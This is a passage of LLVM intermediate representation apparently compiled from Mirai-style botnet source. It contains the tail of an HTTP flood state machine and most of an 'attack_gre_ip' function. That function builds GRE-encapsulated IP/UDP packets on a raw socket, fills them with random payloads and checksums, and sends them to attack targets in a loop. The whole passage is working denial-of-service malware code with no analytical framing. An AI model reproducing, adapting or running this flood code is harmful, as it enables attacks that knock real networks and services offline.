  %872 = call i8* @table_retrieve_val(i32 43, i32* null)
  %873 = call i32 @util_memsearch(i8* nonnull %417, i32 %871, i8* %872, i32 11)
  %874 = sext i32 %873 to i64
  %875 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv676, i32 18, i64 %874
  %876 = load i32, i32* %416, align 4
  %877 = sub nsw i32 %876, %873
  %878 = call i32 @util_memsearch(i8* %875, i32 %877, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i64 0, i64 0), i32 1)
  %879 = add i32 %873, -1
  %880 = add i32 %879, %878
  %881 = sext i32 %880 to i64
  %882 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv676, i32 18, i64 %881
  store i8 0, i8* %882, align 1
  %883 = load i32, i32* %423, align 4
  %884 = icmp slt i32 %883, 5
  br i1 %884, label %885, label %919

; <label>:885:                                    ; preds = %870
  %886 = call i32 @util_strlen(i8* %875)
  %887 = icmp slt i32 %886, 128
  br i1 %887, label %888, label %919

; <label>:888:                                    ; preds = %885
  %889 = sext i32 %883 to i64
  %890 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv676, i32 16, i64 %889, i64 0
  %891 = call i32 @util_strcpy(i8* %890, i8* %875)
  %892 = load i32, i32* %423, align 4
  %893 = sext i32 %892 to i64
  %894 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv676, i32 16, i64 %893, i64 0
  %895 = call i32 @util_strlen(i8* %894)
  %896 = sext i32 %895 to i64
  %897 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv676, i32 16, i64 %893, i64 %896
  %898 = call i32 @util_strcpy(i8* %897, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.14, i64 0, i64 0))
  %899 = add i32 %873, 3
  %900 = add i32 %899, %878
  %901 = sext i32 %900 to i64
  %902 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv676, i32 18, i64 %901
  %903 = load i32, i32* %416, align 4
  %904 = sub nsw i32 %903, %900
  %905 = call i32 @util_memsearch(i8* %902, i32 %904, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i64 0, i64 0), i32 1)
  %906 = add i32 %900, -1
  %907 = add i32 %906, %905
  %908 = sext i32 %907 to i64
  %909 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv676, i32 18, i64 %908
  store i8 0, i8* %909, align 1
  %910 = load i32, i32* %423, align 4
  %911 = sext i32 %910 to i64
  %912 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv676, i32 16, i64 %911, i64 0
  %913 = call i32 @util_strlen(i8* %912)
  %914 = sext i32 %913 to i64
  %915 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv676, i32 16, i64 %911, i64 %914
  %916 = call i32 @util_strcpy(i8* %915, i8* %902)
  %917 = load i32, i32* %423, align 4
  %918 = add nsw i32 %917, 1
  store i32 %918, i32* %423, align 4
  br label %919

; <label>:919:                                    ; preds = %888, %885, %870
  store i32 -1, i32* %420, align 4
  store i8 10, i8* %414, align 4
  br label %.loopexit597

thread-pre-split573:                              ; preds = %866
  %.pr574 = load i32, i32* %420, align 4
  br label %920

; <label>:920:                                    ; preds = %thread-pre-split573, %860, %856
  %921 = phi i32 [ %.pr574, %thread-pre-split573 ], [ %863, %860 ], [ %858, %856 ]
  %.0522 = phi i32 [ %862, %thread-pre-split573 ], [ %862, %860 ], [ 0, %856 ]
  %922 = icmp eq i32 %921, 0
  br i1 %922, label %923, label %950

; <label>:923:                                    ; preds = %920
  %924 = load i32, i32* %422, align 4
  %925 = icmp eq i32 %924, 1
  %926 = load i32, i32* %416, align 4
  br i1 %925, label %927, label %945

; <label>:927:                                    ; preds = %923
  %928 = call i32 @util_memsearch(i8* nonnull %417, i32 %926, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 2)
  %929 = icmp eq i32 %928, -1
  br i1 %929, label %950, label %930

; <label>:930:                                    ; preds = %927
  %931 = add nsw i32 %928, -2
  %932 = sext i32 %931 to i64
  %933 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv676, i32 18, i64 %932
  store i8 0, i8* %933, align 1
  %934 = call i32 @util_memsearch(i8* nonnull %417, i32 %928, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i64 0, i64 0), i32 1)
  %935 = icmp eq i32 %934, -1
  br i1 %935, label %939, label %936

; <label>:936:                                    ; preds = %930
  %937 = sext i32 %934 to i64
  %938 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv676, i32 18, i64 %937
  store i8 0, i8* %938, align 1
  br label %939

; <label>:939:                                    ; preds = %930, %936
  %940 = call i32 @util_atoi(i8* nonnull %417, i32 16)
  %941 = icmp eq i32 %940, 0
  br i1 %941, label %942, label %943

; <label>:942:                                    ; preds = %939
  store i8 1, i8* %414, align 4
  br label %.loopexit597

; <label>:943:                                    ; preds = %939
  %944 = add nsw i32 %940, 2
  store i32 %944, i32* %420, align 4
  br label %950

; <label>:945:                                    ; preds = %923
  %946 = sub nsw i32 %926, %.0522
  store i32 %946, i32* %420, align 4
  %947 = icmp eq i32 %946, 0
  br i1 %947, label %948, label %950

; <label>:948:                                    ; preds = %945
  store i8 1, i8* %414, align 4
  br label %.loopexit597

.backedge:                                        ; preds = %950, %952
  %.pr = load i8, i8* %414, align 4
  %949 = icmp eq i8 %.pr, 7
  br i1 %949, label %834, label %.loopexit597.loopexit

; <label>:950:                                    ; preds = %927, %943, %945, %920
  %.1523 = phi i32 [ %928, %943 ], [ %.0522, %927 ], [ %.0522, %945 ], [ %.0522, %920 ]
  %951 = icmp eq i32 %.1523, 0
  br i1 %951, label %.backedge, label %952

; <label>:952:                                    ; preds = %950
  %953 = load i32, i32* %416, align 4
  %954 = sub nsw i32 %953, %.1523
  store i32 %954, i32* %416, align 4
  %955 = sext i32 %.1523 to i64
  %956 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv676, i32 18, i64 %955
  %957 = sext i32 %954 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* nonnull %417, i8* %956, i64 %957, i32 1, i1 false)
  %958 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %48, i64 %indvars.iv676, i32 18, i64 %957
  store i8 0, i8* %958, align 1
  %959 = load i32, i32* %416, align 4
  %960 = icmp eq i32 %959, 0
  br i1 %960, label %.backedge, label %856

.preheader598:                                    ; preds = %.preheader598.preheader, %.preheader598
  %961 = tail call i32* @__errno_location() #11
  store i32 0, i32* %961, align 4
  %962 = load i32, i32* %378, align 4
  %963 = call i64 @recv(i32 %962, i8* nonnull %21, i64 10240, i32 16384) #10
  %964 = trunc i64 %963 to i32
  switch i32 %964, label %.preheader598 [
    i32 0, label %.thread584
    i32 -1, label %965
  ]

.thread584:                                       ; preds = %.preheader598
  store i32 104, i32* %961, align 4
  br label %.thread578

; <label>:965:                                    ; preds = %.preheader598
  %.pr583 = load i32, i32* %961, align 4
  %966 = icmp eq i32 %.pr583, 11
  br i1 %966, label %969, label %.thread578

.thread578:                                       ; preds = %965, %.thread584
  %967 = load i32, i32* %378, align 4
  %968 = call i32 @close(i32 %967) #10
  store i32 -1, i32* %378, align 4
  store i8 0, i8* %414, align 4
  br label %.loopexit597

; <label>:969:                                    ; preds = %965
  %.pr577 = load i8, i8* %414, align 4
  %970 = icmp eq i8 %.pr577, 0
  br i1 %970, label %.loopexit597, label %971

; <label>:971:                                    ; preds = %969
  store i8 1, i8* %414, align 4
  br label %.loopexit597

.loopexit597.loopexit:                            ; preds = %.backedge
  br label %.loopexit597

.loopexit597:                                     ; preds = %.loopexit597.loopexit, %948, %942, %919, %.thread578, %413, %848, %969, %402, %850, %971, %830, %432, %.lr.ph644, %817, %677, %429, %398
  %indvars.iv.next677 = add nuw nsw i64 %indvars.iv676, 1
  %972 = icmp slt i64 %indvars.iv.next677, %46
  br i1 %972, label %.lr.ph644, label %.backedge602.loopexit

; <label>:973:                                    ; preds = %30, %27, %24, %4
  ret void
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

; Function Attrs: argmemonly nounwind
declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) local_unnamed_addr #2

; Function Attrs: nounwind
declare i64 @time(i64*) local_unnamed_addr #1

declare i32 @close(i32) local_unnamed_addr #6

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) local_unnamed_addr #1

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr #6

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) local_unnamed_addr #1

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) local_unnamed_addr #2

declare i32 @connect(i32, %struct.sockaddr*, i32) local_unnamed_addr #6

declare i64 @send(i32, i8*, i64, i32) local_unnamed_addr #6

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) local_unnamed_addr #6

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) local_unnamed_addr #1

declare i64 @recv(i32, i8*, i64, i32) local_unnamed_addr #6

declare i32 @sleep(i32) local_unnamed_addr #6

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8* nocapture readonly) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define void @attack_gre_ip(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %6 = alloca i32, align 4
  store i32 0, i32* %6, align 4
  %7 = zext i8 %1 to i64
  %8 = tail call noalias i8* @calloc(i64 %7, i64 8) #10
  %9 = bitcast i8* %8 to i8**
  %10 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 2, i32 0)
  %11 = trunc i32 %10 to i8
  %12 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 3, i32 65535)
  %13 = trunc i32 %12 to i16
  %14 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 4, i32 64)
  %15 = trunc i32 %14 to i8
  %16 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 5, i32 1)
  %17 = trunc i32 %16 to i8
  %18 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 6, i32 65535)
  %19 = trunc i32 %18 to i16
  %20 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 7, i32 65535)
  %21 = trunc i32 %20 to i16
  %22 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 0, i32 512)
  %23 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 1, i32 1)
  %24 = trunc i32 %23 to i8
  %25 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 18, i32 0)
  %26 = trunc i32 %25 to i8
  %27 = load i32, i32* @LOCAL_ADDR, align 4
  %28 = tail call i32 @attack_get_opt_int(i8 zeroext %3, %struct.attack_option* %4, i8 zeroext 24, i32 %27)
  %29 = tail call i64 @time(i64* null) #10
  %30 = zext i32 %0 to i64
  %31 = add i64 %29, %30
  %32 = tail call i32 @socket(i32 2, i32 3, i32 6) #10
  %33 = icmp eq i32 %32, -1
  br i1 %33, label %.loopexit, label %34

; <label>:34:                                     ; preds = %5
  store i32 1, i32* %6, align 4
  %35 = bitcast i32* %6 to i8*
  %36 = call i32 @setsockopt(i32 %32, i32 0, i32 3, i8* nonnull %35, i32 4) #10
  %37 = icmp eq i32 %36, -1
  br i1 %37, label %96, label %.preheader129

.preheader129:                                    ; preds = %34
  store i32 0, i32* %6, align 4
  %38 = zext i8 %1 to i32
  %39 = icmp eq i8 %1, 0
  %.pre139 = sext i32 %22 to i64
  %.pre140 = add nsw i64 %.pre139, 52
  br i1 %39, label %.preheader, label %.lr.ph131

.lr.ph131:                                        ; preds = %.preheader129
  %40 = trunc i64 %.pre140 to i16
  %41 = icmp eq i8 %17, 0
  %42 = add nsw i64 %.pre139, 28
  %43 = trunc i64 %42 to i16
  %44 = xor i16 %13, -1
  %45 = icmp eq i8 %26, 0
  %46 = add nsw i64 %.pre139, 8
  %47 = trunc i64 %46 to i16
  %48 = zext i8 %1 to i64
  br i1 %41, label %.lr.ph131.split.preheader, label %.lr.ph131.split.us.preheader

.lr.ph131.split.us.preheader:                     ; preds = %.lr.ph131
  br label %.lr.ph131.split.us

.lr.ph131.split.preheader:                        ; preds = %.lr.ph131
  br label %.lr.ph131.split

.lr.ph131.split.us:                               ; preds = %.lr.ph131.split.us.preheader, %.lr.ph131.split.us
  %indvars.iv136 = phi i64 [ %indvars.iv.next137, %.lr.ph131.split.us ], [ 0, %.lr.ph131.split.us.preheader ]
  %49 = call noalias i8* @calloc(i64 1510, i64 8) #10
  %50 = getelementptr inbounds i8*, i8** %9, i64 %indvars.iv136
  store i8* %49, i8** %50, align 8
  %51 = getelementptr inbounds i8, i8* %49, i64 24
  %52 = getelementptr inbounds i8, i8* %49, i64 44
  store i8 69, i8* %49, align 4
  %53 = getelementptr inbounds i8, i8* %49, i64 1
  store i8 %11, i8* %53, align 1
  %54 = call zeroext i16 @htons(i16 zeroext %40) #11
  %55 = getelementptr inbounds i8, i8* %49, i64 2
  %56 = bitcast i8* %55 to i16*
  store i16 %54, i16* %56, align 2
  %57 = call zeroext i16 @htons(i16 zeroext %13) #11
  %58 = getelementptr inbounds i8, i8* %49, i64 4
  %59 = bitcast i8* %58 to i16*
  store i16 %57, i16* %59, align 4
  %60 = getelementptr inbounds i8, i8* %49, i64 8
  store i8 %15, i8* %60, align 4
  %61 = call zeroext i16 @htons(i16 zeroext 16384) #11
  %62 = getelementptr inbounds i8, i8* %49, i64 6
  %63 = bitcast i8* %62 to i16*
  store i16 %61, i16* %63, align 2
  %64 = getelementptr inbounds i8, i8* %49, i64 9
  store i8 47, i8* %64, align 1
  %65 = getelementptr inbounds i8, i8* %49, i64 12
  %66 = bitcast i8* %65 to i32*
  store i32 %28, i32* %66, align 4
  %67 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %indvars.iv136, i32 1
  %68 = load i32, i32* %67, align 4
  %69 = getelementptr inbounds i8, i8* %49, i64 16
  %70 = bitcast i8* %69 to i32*
  store i32 %68, i32* %70, align 4
  %71 = call zeroext i16 @htons(i16 zeroext 2048) #11
  %72 = getelementptr inbounds i8, i8* %49, i64 22
  %73 = bitcast i8* %72 to i16*
  store i16 %71, i16* %73, align 2
  store i8 69, i8* %51, align 4
  %74 = getelementptr inbounds i8, i8* %49, i64 25
  store i8 %11, i8* %74, align 1
  %75 = call zeroext i16 @htons(i16 zeroext %43) #11
  %76 = getelementptr inbounds i8, i8* %49, i64 26
  %77 = bitcast i8* %76 to i16*
  store i16 %75, i16* %77, align 2
  %78 = call zeroext i16 @htons(i16 zeroext %44) #11
  %79 = getelementptr inbounds i8, i8* %49, i64 28
  %80 = bitcast i8* %79 to i16*
  store i16 %78, i16* %80, align 4
  %81 = getelementptr inbounds i8, i8* %49, i64 32
  store i8 %15, i8* %81, align 4
  %82 = getelementptr inbounds i8, i8* %49, i64 30
  %83 = bitcast i8* %82 to i16*
  store i16 %61, i16* %83, align 2
  %84 = getelementptr inbounds i8, i8* %49, i64 33
  store i8 17, i8* %84, align 1
  %. = select i1 %45, i32 1023, i32 %68
  %85 = getelementptr inbounds i8, i8* %49, i64 40
  %86 = bitcast i8* %85 to i32*
  store i32 %., i32* %86, align 4
  %87 = call zeroext i16 @htons(i16 zeroext %19) #11
  %88 = bitcast i8* %52 to i16*
  store i16 %87, i16* %88, align 2
  %89 = call zeroext i16 @htons(i16 zeroext %21) #11
  %90 = getelementptr inbounds i8, i8* %49, i64 46
  %91 = bitcast i8* %90 to i16*
  store i16 %89, i16* %91, align 2
  %92 = call zeroext i16 @htons(i16 zeroext %47) #11
  %93 = getelementptr inbounds i8, i8* %49, i64 48
  %94 = bitcast i8* %93 to i16*
  store i16 %92, i16* %94, align 2
  %indvars.iv.next137 = add nsw i64 %indvars.iv136, 1
  %95 = icmp slt i64 %indvars.iv.next137, %48
  br i1 %95, label %.lr.ph131.split.us, label %..preheader_crit_edge.loopexit148

; <label>:96:                                     ; preds = %34
  %97 = call i32 @close(i32 %32) #10
  br label %.loopexit

..preheader_crit_edge.loopexit:                   ; preds = %.lr.ph131.split
  br label %..preheader_crit_edge

..preheader_crit_edge.loopexit148:                ; preds = %.lr.ph131.split.us
  br label %..preheader_crit_edge

..preheader_crit_edge:                            ; preds = %..preheader_crit_edge.loopexit148, %..preheader_crit_edge.loopexit
  %.lcssa132.in = phi i64 [ %indvars.iv.next, %..preheader_crit_edge.loopexit ], [ %indvars.iv.next137, %..preheader_crit_edge.loopexit148 ]
  %.lcssa132 = trunc i64 %.lcssa132.in to i32
  store i32 %.lcssa132, i32* %6, align 4
  br label %.preheader

.preheader:                                       ; preds = %.preheader129, %..preheader_crit_edge
  %98 = icmp eq i32 %28, -1
  %99 = and i32 %12, 65535
  %100 = icmp eq i32 %99, 65535
  %101 = and i32 %18, 65535
  %102 = icmp eq i32 %101, 65535
  %103 = and i32 %20, 65535
  %104 = icmp eq i32 %103, 65535
  %105 = icmp eq i8 %26, 0
  %106 = icmp eq i8 %24, 0
  %107 = add i32 %22, 8
  %sext = shl i64 %31, 32
  %108 = ashr exact i64 %sext, 32
  br label %151

.lr.ph131.split:                                  ; preds = %.lr.ph131.split.preheader, %.lr.ph131.split
  %indvars.iv = phi i64 [ %indvars.iv.next, %.lr.ph131.split ], [ 0, %.lr.ph131.split.preheader ]
  %109 = call noalias i8* @calloc(i64 1510, i64 8) #10
  %110 = getelementptr inbounds i8*, i8** %9, i64 %indvars.iv
  store i8* %109, i8** %110, align 8
  %111 = getelementptr inbounds i8, i8* %109, i64 24
  %112 = getelementptr inbounds i8, i8* %109, i64 44
  store i8 69, i8* %109, align 4
  %113 = getelementptr inbounds i8, i8* %109, i64 1
  store i8 %11, i8* %113, align 1
  %114 = call zeroext i16 @htons(i16 zeroext %40) #11
  %115 = getelementptr inbounds i8, i8* %109, i64 2
  %116 = bitcast i8* %115 to i16*
  store i16 %114, i16* %116, align 2
  %117 = call zeroext i16 @htons(i16 zeroext %13) #11
  %118 = getelementptr inbounds i8, i8* %109, i64 4
  %119 = bitcast i8* %118 to i16*
  store i16 %117, i16* %119, align 4
  %120 = getelementptr inbounds i8, i8* %109, i64 8
  store i8 %15, i8* %120, align 4
  %121 = getelementptr inbounds i8, i8* %109, i64 9
  store i8 47, i8* %121, align 1
  %122 = getelementptr inbounds i8, i8* %109, i64 12
  %123 = bitcast i8* %122 to i32*
  store i32 %28, i32* %123, align 4
  %124 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %indvars.iv, i32 1
  %125 = load i32, i32* %124, align 4
  %126 = getelementptr inbounds i8, i8* %109, i64 16
  %127 = bitcast i8* %126 to i32*
  store i32 %125, i32* %127, align 4
  %128 = call zeroext i16 @htons(i16 zeroext 2048) #11
  %129 = getelementptr inbounds i8, i8* %109, i64 22
  %130 = bitcast i8* %129 to i16*
  store i16 %128, i16* %130, align 2
  store i8 69, i8* %111, align 4
  %131 = getelementptr inbounds i8, i8* %109, i64 25
  store i8 %11, i8* %131, align 1
  %132 = call zeroext i16 @htons(i16 zeroext %43) #11
  %133 = getelementptr inbounds i8, i8* %109, i64 26
  %134 = bitcast i8* %133 to i16*
  store i16 %132, i16* %134, align 2
  %135 = call zeroext i16 @htons(i16 zeroext %44) #11
  %136 = getelementptr inbounds i8, i8* %109, i64 28
  %137 = bitcast i8* %136 to i16*
  store i16 %135, i16* %137, align 4
  %138 = getelementptr inbounds i8, i8* %109, i64 32
  store i8 %15, i8* %138, align 4
  %139 = getelementptr inbounds i8, i8* %109, i64 33
  store i8 17, i8* %139, align 1
  %.144 = select i1 %45, i32 1023, i32 %125
  %140 = getelementptr inbounds i8, i8* %109, i64 40
  %141 = bitcast i8* %140 to i32*
  store i32 %.144, i32* %141, align 4
  %142 = call zeroext i16 @htons(i16 zeroext %19) #11
  %143 = bitcast i8* %112 to i16*
  store i16 %142, i16* %143, align 2
  %144 = call zeroext i16 @htons(i16 zeroext %21) #11
  %145 = getelementptr inbounds i8, i8* %109, i64 46
  %146 = bitcast i8* %145 to i16*
  store i16 %144, i16* %146, align 2
  %147 = call zeroext i16 @htons(i16 zeroext %47) #11
  %148 = getelementptr inbounds i8, i8* %109, i64 48
  %149 = bitcast i8* %148 to i16*
  store i16 %147, i16* %149, align 2
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %150 = icmp slt i64 %indvars.iv.next, %48
  br i1 %150, label %.lr.ph131.split, label %..preheader_crit_edge.loopexit

; <label>:151:                                    ; preds = %.preheader, %._crit_edge
  store i32 0, i32* %6, align 4
  br i1 %39, label %._crit_edge, label %.lr.ph

.lr.ph:                                           ; preds = %151
  br i1 %98, label %.lr.ph.split.us.preheader, label %.lr.ph.split.preheader

.lr.ph.split.preheader:                           ; preds = %.lr.ph
  br label %.lr.ph.split

.lr.ph.split.us.preheader:                        ; preds = %.lr.ph
  br label %.lr.ph.split.us

.lr.ph.split.us:                                  ; preds = %.lr.ph.split.us.preheader, %194
  %storemerge128130.us = phi i32 [ %221, %194 ], [ 0, %.lr.ph.split.us.preheader ]
  %152 = sext i32 %storemerge128130.us to i64
  %153 = getelementptr inbounds i8*, i8** %9, i64 %152
  %154 = load i8*, i8** %153, align 8
  %155 = getelementptr inbounds i8, i8* %154, i64 24
  %156 = bitcast i8* %155 to %struct.iphdr*
  %157 = getelementptr inbounds i8, i8* %154, i64 44
  %158 = getelementptr inbounds i8, i8* %154, i64 52
  %159 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %152, i32 2
  %160 = load i8, i8* %159, align 4
  %161 = icmp ult i8 %160, 32
  br i1 %161, label %162, label %169

; <label>:162:                                    ; preds = %.lr.ph.split.us
  %163 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %152, i32 1
  %164 = load i32, i32* %163, align 4
  %165 = call i32 @ntohl(i32 %164) #11
  %166 = call i32 @htonl(i32 %165) #11
  %167 = getelementptr inbounds i8, i8* %154, i64 16
  %168 = bitcast i8* %167 to i32*
  store i32 %166, i32* %168, align 4
  br label %169

; <label>:169:                                    ; preds = %.lr.ph.split.us, %162
  %170 = getelementptr inbounds i8, i8* %154, i64 12
  %171 = bitcast i8* %170 to i32*
  store i32 0, i32* %171, align 4
  br i1 %100, label %172, label %177

; <label>:172:                                    ; preds = %169
  %173 = getelementptr inbounds i8, i8* %154, i64 4
  %174 = bitcast i8* %173 to i16*
  store i16 0, i16* %174, align 4
  %175 = getelementptr inbounds i8, i8* %154, i64 28
  %176 = bitcast i8* %175 to i16*
  store i16 999, i16* %176, align 4
  br label %177

; <label>:177:                                    ; preds = %172, %169
  br i1 %102, label %178, label %180

; <label>:178:                                    ; preds = %177
  %179 = bitcast i8* %157 to i16*
  store i16 0, i16* %179, align 2
  br label %180

; <label>:180:                                    ; preds = %178, %177
  br i1 %104, label %181, label %184

; <label>:181:                                    ; preds = %180
  %182 = getelementptr inbounds i8, i8* %154, i64 46
  %183 = bitcast i8* %182 to i16*
  store i16 0, i16* %183, align 2
  br label %184

; <label>:184:                                    ; preds = %181, %180
  br i1 %105, label %189, label %185

; <label>:185:                                    ; preds = %184
  %186 = getelementptr inbounds i8, i8* %154, i64 16
  %187 = bitcast i8* %186 to i32*
  %188 = load i32, i32* %187, align 4
  br label %189

; <label>:189:                                    ; preds = %185, %184
  %.sink3.us = phi i32 [ %188, %185 ], [ 0, %184 ]
  %190 = getelementptr inbounds i8, i8* %154, i64 40
  %191 = bitcast i8* %190 to i32*
  store i32 %.sink3.us, i32* %191, align 4
  br i1 %106, label %194, label %192

; <label>:192:                                    ; preds = %189
  call void @rand_alphastr(i8* nonnull %158, i32 %22)
  %193 = getelementptr inbounds i8, i8* %158, i64 %.pre139
  store i8 0, i8* %193, align 1
  %.pre138 = load i32, i32* %6, align 4
  br label %194

; <label>:194:                                    ; preds = %192, %189
  %195 = phi i32 [ %.pre138, %192 ], [ %storemerge128130.us, %189 ]
  %196 = getelementptr inbounds i8, i8* %154, i64 10
  %197 = bitcast i8* %196 to i16*
  store i16 0, i16* %197, align 2
  %198 = bitcast i8* %154 to i16*
  %199 = call zeroext i16 @checksum_generic(i16* %198, i32 20)
  store i16 %199, i16* %197, align 2
  %200 = getelementptr inbounds i8, i8* %154, i64 34
  %201 = bitcast i8* %200 to i16*
  store i16 0, i16* %201, align 2
  %202 = bitcast i8* %155 to i16*
  %203 = call zeroext i16 @checksum_generic(i16* %202, i32 20)
  store i16 %203, i16* %201, align 2
  %204 = getelementptr inbounds i8, i8* %154, i64 50
  %205 = bitcast i8* %204 to i16*
  store i16 0, i16* %205, align 2
  %206 = getelementptr inbounds i8, i8* %154, i64 48
  %207 = bitcast i8* %206 to i16*
  %208 = load i16, i16* %207, align 2
  %209 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* nonnull %156, i8* nonnull %157, i16 zeroext %208, i32 %107)
  store i16 %209, i16* %205, align 2
  %210 = sext i32 %195 to i64
  %211 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %210, i32 0, i32 0
  store i16 2, i16* %211, align 4
  %212 = getelementptr inbounds i8, i8* %154, i64 16
  %213 = bitcast i8* %212 to i32*
  %214 = load i32, i32* %213, align 4
  %215 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %210, i32 0, i32 2, i32 0
  store i32 %214, i32* %215, align 4
  %216 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %210, i32 0, i32 1
  store i16 0, i16* %216, align 2
  %217 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %210, i32 0
  %218 = bitcast %struct.sockaddr_in* %217 to %struct.sockaddr*
  %219 = call i64 @sendto(i32 %32, i8* nonnull %154, i64 %.pre140, i32 16384, %struct.sockaddr* %218, i32 16) #10
  %220 = load i32, i32* %6, align 4
  %221 = add nsw i32 %220, 1
  store i32 %221, i32* %6, align 4
  %222 = icmp slt i32 %221, %38
  br i1 %222, label %.lr.ph.split.us, label %._crit_edge.loopexit

.lr.ph.split:                                     ; preds = %.lr.ph.split.preheader, %263
  %storemerge128130 = phi i32 [ %290, %263 ], [ 0, %.lr.ph.split.preheader ]
  %223 = sext i32 %storemerge128130 to i64
  %224 = getelementptr inbounds i8*, i8** %9, i64 %223
  %225 = load i8*, i8** %224, align 8
  %226 = getelementptr inbounds i8, i8* %225, i64 24
  %227 = bitcast i8* %226 to %struct.iphdr*
  %228 = getelementptr inbounds i8, i8* %225, i64 44
  %229 = getelementptr inbounds i8, i8* %225, i64 52
  %230 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %223, i32 2
  %231 = load i8, i8* %230, align 4
  %232 = icmp ult i8 %231, 32
  br i1 %232, label %233, label %240

; <label>:233:                                    ; preds = %.lr.ph.split
  %234 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %2, i64 %223, i32 1
  %235 = load i32, i32* %234, align 4
  %236 = call i32 @ntohl(i32 %235) #11
  %237 = call i32 @htonl(i32 %236) #11
  %238 = getelementptr inbounds i8, i8* %225, i64 16
  %239 = bitcast i8* %238 to i32*
  store i32 %237, i32* %239, align 4
  br label %240

; <label>:240:                                    ; preds = %.lr.ph.split, %233
  br i1 %100, label %241, label %246

; <label>:241:                                    ; preds = %240
  %242 = getelementptr inbounds i8, i8* %225, i64 4
  %243 = bitcast i8* %242 to i16*
  store i16 0, i16* %243, align 4
  %244 = getelementptr inbounds i8, i8* %225, i64 28
  %245 = bitcast i8* %244 to i16*
  store i16 999, i16* %245, align 4
  br label %246

; <label>:246:                                    ; preds = %241, %240
  br i1 %102, label %247, label %249

; <label>:247:                                    ; preds = %246
  %248 = bitcast i8* %228 to i16*
  store i16 0, i16* %248, align 2
  br label %249

; <label>:249:                                    ; preds = %247, %246
  br i1 %104, label %250, label %253

; <label>:250:                                    ; preds = %249
  %251 = getelementptr inbounds i8, i8* %225, i64 46
  %252 = bitcast i8* %251 to i16*
  store i16 0, i16* %252, align 2
  br label %253

; <label>:253:                                    ; preds = %250, %249
  br i1 %105, label %258, label %254

; <label>:254:                                    ; preds = %253
  %255 = getelementptr inbounds i8, i8* %225, i64 16
  %256 = bitcast i8* %255 to i32*
  %257 = load i32, i32* %256, align 4
  br label %258

; <label>:258:                                    ; preds = %253, %254
  %.sink3 = phi i32 [ %257, %254 ], [ 0, %253 ]
  %259 = getelementptr inbounds i8, i8* %225, i64 40
  %260 = bitcast i8* %259 to i32*
  store i32 %.sink3, i32* %260, align 4
  br i1 %106, label %263, label %261

; <label>:261:                                    ; preds = %258
  call void @rand_alphastr(i8* nonnull %229, i32 %22)
  %262 = getelementptr inbounds i8, i8* %229, i64 %.pre139
  store i8 0, i8* %262, align 1
  %.pre = load i32, i32* %6, align 4
  br label %263

; <label>:263:                                    ; preds = %258, %261
  %264 = phi i32 [ %storemerge128130, %258 ], [ %.pre, %261 ]
